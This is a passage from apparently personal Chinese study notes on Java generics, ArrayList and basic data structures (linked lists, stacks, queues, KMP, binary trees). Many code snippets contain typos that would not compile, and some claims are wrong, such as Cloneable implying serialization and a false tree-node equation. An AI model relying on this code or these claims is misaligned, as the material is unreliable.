class="variable">str</span> <span class="operator">=</span>（String）myArray.get(<span class="number">0</span>);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T&gt;&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,T val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (T)array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       Myarray&lt;String&gt; myarry = <span class="keyword">new</span> <span class="title class_">Myarray</span>&lt;&gt;();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">           <span class="comment">//myArray.set(1,90);</span></span><br><span class="line">           <span class="comment">//这里就不能放整型了</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);<span class="comment">//不用强转</span></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然数组是Object类型的元素 但是return强转为T类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T&gt;&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  <span class="comment">//建议的写法</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,T val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (T)array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       Myarray&lt;String&gt; myarry = <span class="keyword">new</span> <span class="title class_">Myarray</span>&lt;&gt;();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">           <span class="comment">//myArray.set(1,90);</span></span><br><span class="line">           <span class="comment">//这里就不能放整型了</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);<span class="comment">//不用强转</span></span><br><span class="line">            System.out.println(str);</span><br><span class="line">           </span><br><span class="line">      MyArray&lt;Integer&gt; myArray2 = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();</span><br><span class="line">      </span><br><span class="line">           MyArray2.set(<span class="number">1</span>,<span class="number">11</span>);</span><br><span class="line">           MyArray2.set(<span class="number">1</span>,<span class="string">&quot;123&quot;</span>);<span class="comment">//报错 使用泛型编译器辅助检查 只能使用传参给T类型的参数</span></span><br><span class="line"></span><br><span class="line">           <span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> mySrray.get(<span class="number">0</span>);</span><br><span class="line">           Sysytem.out,println(a);<span class="comment">//可直接打印</span></span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泛型的主要目的"><a href="#泛型的主要目的" class="headerlink" title="泛型的主要目的"></a>泛型的主要目的</h4><p>指定当前容器 要持有什么类型的对象 让编译器去检查</p><p>泛型中不允许 实例化一个类型的数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T[] array = <span class="keyword">new</span> <span class="title class_">T</span>[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//报错</span></span><br><span class="line"><span class="keyword">public</span> T[] array = <span class="keyword">new</span> (T[])Object[<span class="number">10</span>];<span class="comment">//不一定好 报警告</span></span><br></pre></td></tr></table></figure><hr><p><strong>泛型只接收类</strong> <strong>基本数据类型必须使用包装类</strong><br>&lt;&gt;中只能是引用类型 不能是基本类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MyArray &lt;<span class="type">int</span>&gt;myArry = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();<span class="comment">//x</span></span><br><span class="line">MyArray &lt;Integer&gt;myArry = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();<span class="comment">//v</span></span><br></pre></td></tr></table></figure><h4 id="泛型是如何编译的"><a href="#泛型是如何编译的" class="headerlink" title="泛型是如何编译的"></a>泛型是如何编译的</h4><p> 编译的时候 将所有的T擦除为Object 运行时 没有泛型这样的概念【泛型的擦除机制只存在于编译期间】 </p><h4 id="泛型的上界（extends-拓展）"><a href="#泛型的上界（extends-拓展）" class="headerlink" title="泛型的上界（extends 拓展）"></a>泛型的上界（extends 拓展）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt;&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//Number为上界 一定为T的父类</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Compable</span>&lt;T&gt;&gt;&#123;<span class="comment">//T一定实现compareable接口</span></span><br><span class="line">   <span class="keyword">public</span> T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Alg&lt;Integer&gt; alg = <span class="keyword">new</span> <span class="title class_">Alg</span>&lt;&gt;();</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&#123;</span><br><span class="line">   <span class="keyword">public</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                                             </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Alg</span> <span class="variable">alg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Alg</span>();</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;                                 </span><br></pre></td></tr></table></figure><p><strong>静态</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                                             </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> Alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;       </span><br></pre></td></tr></table></figure><h3 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h3><p>继承Collection Collection继承于Iterable</p><p>线性表 n个具有相同类型元素的有限序列 在该序列上额可以执行增删改查以及变量等操作</p><p><strong>List是个接口 不能用来实例化 在集合框架中 ArrayList和LinkedList都实现了List接口</strong><br>equals  返回值true&#x2F;false<br>compareto 比较大于小于等于</p><p>数组中的引用类型需要逐个滞空</p><h5 id="ArrayList的用法"><a href="#ArrayList的用法" class="headerlink" title="ArrayList的用法"></a>ArrayList的用法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//调用的方法更多 </span></span><br><span class="line">   List&lt;Integer&gt; list2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">  <span class="comment">// 一个接口引用一个具体的实现类 可以发生向上转型但只能调用List接口类方法</span></span><br><span class="line">  list2.add(<span class="number">1</span>);<span class="comment">//默认放到数组最后一个位置 默认++</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.ArrayLIist是以泛型的方式实现的 使用时必须先实例化<br>2.ArrayList实现了RandomAccess接口 表明ArrayList支持随机访问<br>3.ArrayList实现了Cloneable接口 表明ArrayList支持序列化<br>4.ArrayList实现了Serializable接口，表明ArrayList是支持序列化的<br>5.和Vector不同 ArrayList不是线程安全的 在单线程下可以使用  在多线程中可以选择Vector或者CopyOnWriteArrayList<br>6.ArrayList底层是一段连续的空间 可以动态扩容 是一个动态类型的顺序表</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/"/>
      <url>/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="数据结构碎片"><a href="#数据结构碎片" class="headerlink" title="数据结构碎片"></a>数据结构碎片</h2><h5 id="一元多项式"><a href="#一元多项式" class="headerlink" title="一元多项式"></a>一元多项式</h5><p>简单数组表示 存储系数和指数，一一对应，运算即分类操作既可<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231123131613823.png" alt="image-20231123131613823"></p><h5 id="稀疏多项式"><a href="#稀疏多项式" class="headerlink" title="稀疏多项式"></a>稀疏多项式</h5><p> 记录系数不为零的项 每一项的系数和指数也构成线性表（先系数再指数）</p><p><strong>稀疏多项式的运算</strong></p><p>新开设新数组C（第三个数组相当于中间存储） </p><p>从头开始遍历比较a和b的每一项<br>指数相同 对应系数相加，和不为0，C中新增加新项;和为0，去掉 即可</p><p>指数不相同，将指数较小的项复制到C中</p><p><u>一个多项式已遍历完毕时，将另一个剩余项依次复制到C中即可 </u></p><p><strong>顺序存储存在的问题</strong></p><p>1.存储空间分配不灵活<br>2.运算的空间复杂度高</p><h5 id="链式存储解决稀疏多项式"><a href="#链式存储解决稀疏多项式" class="headerlink" title="链式存储解决稀疏多项式"></a>链式存储解决稀疏多项式</h5><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231123132146214.png" alt="image-20231123132146214"></p><h5 id="线性表中的数据元素的类型可以是简单-复杂类型"><a href="#线性表中的数据元素的类型可以是简单-复杂类型" class="headerlink" title="线性表中的数据元素的类型可以是简单&#x2F;复杂类型"></a><strong>线性表中的数据元素的类型可以是简单&#x2F;复杂类型</strong></h5><h3 id="线性表的定义类型"><a href="#线性表的定义类型" class="headerlink" title="线性表的定义类型"></a>线性表的定义类型</h3><h5 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h5><p>InitList(&amp;L)<br>操作结果：构造一个空链表</p><p>DestroyList(&amp;L)<br>初始条件：线性表L已经存在<br>操作结果：销毁线性表L</p><p>ClearList(&amp;L)<br>初始条件：线性表L已经存在<br>操作结果：将线性表L重置为空表</p><p>ListEmpty(L)<br>初始条件：线性表已经存在<br>操作结果：若L为空返回TRUE,否则返回FALSE</p><p>ListLength(L)<br>初始条件：线性表已经存在<br>操作结果：返回L中数据元素个数</p><p>GetElem(L,i,&amp;e)<br>初始条件：线性表L已经存在，1&lt;&#x3D;i&lt;&#x3D;ListLength(L)<br>操作结果： 用e返回线性表L中第i个数据的值</p><p>LocateElem（L，e，compare（））<br>初始条件：线性表L已经存在，compare（）是数据元素判定函数<br>操作结果：返回L中第1个与e满足compare（）的数据元素的位序。如不存在这样的数据元素则返回0.  </p><p>PriorElem(L,cur_e,&amp;pre_e)<br>初始条件：线性表L已经存在<br>操作结果：若cur_e是L的数据元素且不是第一个，则用pre_e返回它的前驱否则操作失败，pre_e无意义</p><p>NextElem(L,cur_e,&amp;next_e)<br>初始条件：线性表L已经存在<br>操作结果：若cur_e是L的数据元素且不是最后一个，则用next_e返回它的前驱否则操作失败，next_e无意义</p><p>ListInsert(&amp;L,i,e)<br>初始条件：L已存在，1&lt;&#x3D;i&lt;&#x3D;ListLength(L)+1<br>操作结果：在L的第i个位置插入新的元素e，L长度+1<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231127113252697.png" alt="image-20231127113252697"></p><p>ListDelete(&amp;L,i,e)<br>初始条件：L已经存在，1&lt;&#x3D;i&lt;&#x3D;ListLength(L)<br>操作结果：删除L的第i个数据，并用e返回其值，L长度-1</p><p>ListTraverse(&amp;L,visited())<br>初始条件：L已经存在<br>操作结果：依次对线性表中每个元素调用visited（）</p><p><strong>抽象数据类型线性表的定义</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231204104700401.png" alt="image-20231204104700401"></p><h4 id="线性表的顺序存储结构"><a href="#线性表的顺序存储结构" class="headerlink" title="线性表的顺序存储结构"></a>线性表的顺序存储结构</h4><p><strong>典例：一维数组</strong></p><p>定义：把逻辑上相邻的数据元素存储在物理相邻的存储单元中的存储结构。<br><strong>占用一块连续的存储空间方便计算得出其他元素的存储位置</strong><br><u>loc（ai）&#x3D;loc（a1）+（i-1）</u>×l（存储单元长度）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIST _INIT_SIZE 100<span class="comment">//线性存储空间的初始分配量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"> ElemType elem[LIST_INIT_SIZE];</span><br><span class="line"> <span class="type">int</span> length;<span class="comment">//当前长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h3 id="数组模拟单链表"><a href="#数组模拟单链表" class="headerlink" title="数组模拟单链表"></a>数组模拟单链表</h3><p>邻接表（最常用）<br>存储图和树<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20230911185245253.png" alt="image-20230911185245253"></p><p>空节点下标用-1表示<br>联邦每个节点存储两个值：内容和指向下一节点指针</p><h4 id="顺序表的插入"><a href="#顺序表的插入" class="headerlink" title="顺序表的插入"></a>顺序表的插入</h4><p>三步骤：<br>从后往前赋值<br>对目标位置进行赋值<br>列表长度+1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = L.length;j&gt;=i;j--)<span class="comment">//让j=当前列表长度，i后的数据依次后移</span></span><br><span class="line">&#123;</span><br><span class="line">L.data[j] = L.data[j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">L.data[i<span class="number">-1</span>] = e;<span class="comment">//让第i个数=e，但数组下标-</span></span><br><span class="line">L.length++;<span class="comment">//插入一个后，表的原有长度+1</span></span><br></pre></td></tr></table></figure><h4 id="顺序表的删除"><a href="#顺序表的删除" class="headerlink" title="顺序表的删除"></a>顺序表的删除</h4><p>三步骤：<br>被删除的目标元素赋值给e<br>把第i个位置的元素前移<br>列表长度-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = L.data[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = i;j&lt;L.length;j++)&#123;</span><br><span class="line">L.data[j<span class="number">-1</span>] = L.data[j];</span><br><span class="line">&#125;</span><br><span class="line">L.length--;</span><br></pre></td></tr></table></figure><h4 id="单链表的头插法（逆序）和尾插法（正序）"><a href="#单链表的头插法（逆序）和尾插法（正序）" class="headerlink" title="单链表的头插法（逆序）和尾插法（正序）"></a>单链表的头插法（逆序）和尾插法（正序）</h4><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231224235713856.png" alt="image-20231224235713856"></p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231224235737641.png" alt="image-20231224235737641"></p><h4 id="单链表的删除"><a href="#单链表的删除" class="headerlink" title="单链表的删除"></a>单链表的删除</h4><p>1.找点要删除单链表的父节点<br>2.待删除节点的父节点&#x3D;待删除节点的字节点<br>3.释放节点</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225105201271.png" alt="image-20231225105201271"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Node prev = dummyHead;<span class="comment">//指向头节点</span></span><br><span class="line"><span class="keyword">for</span>（<span class="type">int</span> i = <span class="number">0</span>;i &lt; index; i++）&#123;</span><br><span class="line">prev = pev.next;</span><br><span class="line">NodeHead retNode = prev.next;<span class="comment">//retNode为待删除节点</span></span><br><span class="line">prev.next = retNode.next;<span class="comment">//删除节点</span></span><br><span class="line"><span class="built_in">free</span>(retNode);<span class="comment">//释放节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双向链表的插入和删除"><a href="#双向链表的插入和删除" class="headerlink" title="双向链表的插入和删除"></a>双向链表的插入和删除</h3><p>1.插入<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225105902718.png" alt="image-20231225105902718"></p><p>p节点保留相应信息<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110235205.png" alt="image-20231225110235205"></p><h3 id="入栈和出栈"><a href="#入栈和出栈" class="headerlink" title="入栈和出栈"></a>入栈和出栈</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110728355.png" alt="image-20231225110728355"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110638880.png" alt="image-20231225110638880"></p><h4 id="队列的入队和出队"><a href="#队列的入队和出队" class="headerlink" title="队列的入队和出队"></a>队列的入队和出队</h4><p>队列特点：先进先出<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231226105602978.png" alt="image-20231226105602978"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231226105828912.png" alt="image-20231226105828912"></p><h4 id="next数组求解"><a href="#next数组求解" class="headerlink" title="next数组求解"></a>next数组求解</h4><p>KMP算法</p><p>next[i] &#x3D; 最近匹配字符个数+1<br>正常第一位数从0开始<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/QQ%E6%88%AA%E5%9B%BE20231227093954.png" alt="QQ截图20231227093954"></p><h4 id="nextval数组求解"><a href="#nextval数组求解" class="headerlink" title="nextval数组求解"></a>nextval数组求解</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094200599.png" alt="image-20231227094200599"></p><h4 id="树节点的计算"><a href="#树节点的计算" class="headerlink" title="树节点的计算"></a>树节点的计算</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094234032.png" alt="image-20231227094234032"></p><p>树总结点N &#x3D; 度数✖对应接节点个数+1（根节点）<br>上图N &#x3D; 3a+2b+c+1 &#x3D; a+b+c+1<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094253091.png" alt="image-20231227094253091"></p><h4 id="满二叉树和完全二叉树"><a href="#满二叉树和完全二叉树" class="headerlink" title="满二叉树和完全二叉树"></a>满二叉树和完全二叉树</h4><h5 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h5><p><strong>定义</strong><br>一颗深度为k且有2^k-1个结点的二叉树.<br><strong>特点</strong><br>1.每层都是满的<br>2.只有度为0和2的节点<br>3.含n个结点的满二叉树高度为log2(n+1)<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094617607.png" alt="image-20231227094617607"></p><h5 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h5><p><strong>定义</strong><br>深度为k具有n个结点的二叉树，当且仅当其每一个结点都与深度为k的满二叉树编号为1-n的结点一一对应.<br><strong>特点</strong><br>1.叶子结点只可能出现在最下面两层中<br>2.最下一层叶子结点都依次排列在该层最左边的位置上<br>3.若有度为1的结点只可能有1个且该结点只有左孩子无右孩子<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227184713123.png" alt="image-20231227184713123"></p><h5 id="非完全二叉树"><a href="#非完全二叉树" class="headerlink" title="非完全二叉树"></a>非完全二叉树</h5><p>  <img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227185531440.png" alt="image-20231227185531440"></p><h5 id="常用公式"><a href="#常用公式" class="headerlink" title="常用公式"></a>常用公式</h5><p>$$<br>叶子结点的数量（n0） &#x3D; 度为2的结点（n2）+1<br>$$</p><p>$$<br>n(总节点) &#x3D; n0（叶子节点）+n1（度为1的节点）+n2（同前） &#x3D; 2n2+n1+1<br>n0 &#x3D; n2+1<br>$$</p><h4 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h4><p>先序遍历：根左右<br>中序遍历：左根右<br>后序遍历：左右根</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227194941329.png" alt="image-20231227194941329"></p><p>先序遍历第一个为根节点<br>后序遍历最后一个是根节点<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227200402845.png" alt="image-20231227200402845"></p><h4 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h4><h5 id="前序线索二叉树"><a href="#前序线索二叉树" class="headerlink" title="前序线索二叉树"></a>前序线索二叉树</h5><p>缺少左孩子画出前驱 缺少右孩子画出后继</p><p><img 